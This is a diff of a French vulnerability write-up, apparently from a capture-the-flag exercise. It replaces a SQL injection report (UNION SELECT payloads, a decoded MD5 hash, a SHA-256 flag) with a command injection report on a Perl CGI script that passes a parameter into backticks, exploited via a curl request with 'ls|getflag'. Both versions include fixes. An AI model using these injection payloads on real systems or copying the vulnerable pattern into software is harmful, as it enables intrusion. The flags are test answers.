@@ -1,62 +1,70 @@
-# Rapport de Vulnérabilité : Injection SQL
-
-## Nom de la Faille
-Injection SQL
-
-## OWASP
-**A03:2021 – Injection**
+# Rapport de Vulnérabilité : Injection de commande dans un script Perl via un paramètre non filtré
 
 ## Description
-Cette faille permet à un attaquant d'exécuter des requêtes SQL arbitraires via un formulaire de recherche de membre par ID. En exploitant cette faille, l'attaquant peut accéder à des informations sensibles de la base de données, telles que les noms de tables, les noms de colonnes et même les données stockées dans ces colonnes.
+
+Dans ce niveau, un script Perl accessible sur le port `4747` contient une faille critique d’exécution de commande. Le paramètre `x`, passé via une requête HTTP, est directement injecté dans une commande système sans aucun filtrage. Cela permet à un attaquant d’exécuter arbitrairement des commandes sur le système via une simple requête `curl`.
 
 ## Comment Exploiter la Faille
 
-### Étape 1 : Découverte de la base de données
-Pour connaître la base de données active sur laquelle nous sommes connectés, nous utilisons la commande suivante :
-```
-1 UNION ALL SELECT 1, DATABASE()
+### Étape 1 : Analyse du script Perl
+
+Contenu du script `level04.pl` :
+
+```perl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
 ```
 
-### Étape 2 : Récupération des tables
-Pour obtenir la liste de toutes les tables de la base de données active, nous exécutons la commande suivante :
-```
-1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
+Le script récupère le paramètre `x` et l’insère directement dans une commande système `echo`, sans échappement ni validation.
+
+### Étape 2 : Compréhension de la faille
+
+La ligne vulnérable est :
+
+```perl
+print `echo $y 2>&1`;
 ```
 
-### Étape 3 : Récupération des colonnes
-Une fois les tables identifiées, nous récupérons les colonnes associées à chaque table avec la commande suivante :
-```
-1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
+En Perl, les backticks (`` ` ``) exécutent une commande système.
+Si l’on fournit une valeur comme `ls|getflag` dans le paramètre `x`, on injecte une commande supplémentaire (`getflag`), exécutée immédiatement après `ls`.
+
+### Étape 3 : Exploitation avec `curl`
+
+On exploite la faille avec une requête HTTP locale :
+
+```bash
+curl "http://localhost:4747/?x=ls|getflag"
 ```
 
-### Étape 4 : Extraction du contenu des colonnes
-Pour obtenir le contenu d'une colonne spécifique d'une table, nous utilisons :
+Le `|` permet d’exécuter `getflag` après `ls`. Comme aucune protection n'est mise en place, la commande est acceptée et exécutée.
+
+### Étape 4 : Récupération du flag
+
+Le flag est affiché directement dans la réponse HTTP :
+
 ```
-1 AND 1=2 UNION SELECT {column_name}, null FROM users
+ne2searoevaevoem4ov4ar8ap
 ```
 
-### Étape 5 : Traitement des données extraites
-Dans la colonne "Commentaire", nous obtenons un message nous indiquant de :
-1. Déchiffrer le code en MD5.
-2. Mettre le résultat en minuscule.
-3. Encrypter ce résultat en SHA-256.
-
-### Exemple de traitement
-- Code MD5 extrait : `5ff9d0165b4f92b14994e5c685cdce28`
-- Décodage MD5 : `FortyTwo`
-- Conversion en minuscule : `fortytwo`
-- Encodage SHA-256 :
-```
-10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
-```
+---
 
 ## Comment Résoudre la Faille
-Pour corriger cette vulnérabilité, suivez ces étapes :
 
-1. **Paramétrisation des requêtes** : Utilisez des instructions SQL paramétrées pour éviter l'exécution directe de chaînes de caractères.
-2. **Échappement des entrées utilisateurs** : Vérifiez et échappez toutes les entrées pour empêcher l'injection SQL.
-3. **Validation côté serveur** : Ne faites jamais confiance aux données envoyées par l'utilisateur.
-4. **Journalisation** : Surveillez les tentatives suspectes d'injection pour détecter toute activité malveillante.
+Pour corriger cette vulnérabilité :
+
+* **Ne jamais exécuter directement des entrées utilisateur** dans des appels système (\`\`, system(), exec()…).
+* **Utiliser des fonctions sécurisées** : En Perl, il est préférable d’utiliser des appels à des commandes avec des listes, ou mieux, d’éviter complètement l’exécution de commandes système.
+* **Filtrer et échapper tous les paramètres** : Valider le contenu attendu (liste blanche) avant tout traitement.
 
 ## Conclusion
-L'injection SQL est une vulnérabilité critique pouvant exposer des données sensibles. L'utilisation de requêtes paramétrées, la validation côté serveur et l'échappement approprié des entrées sont des pratiques indispensables pour sécuriser les applications web contre cette attaque.
+
+Cette faille classique d'injection de commande permet à un attaquant d’exécuter arbitrairement des commandes sur le système à distance, via un simple paramètre HTTP. Ce genre d’erreur illustre l’importance de **ne jamais faire confiance à une entrée utilisateur**, même dans un script local ou interne.
+
+---
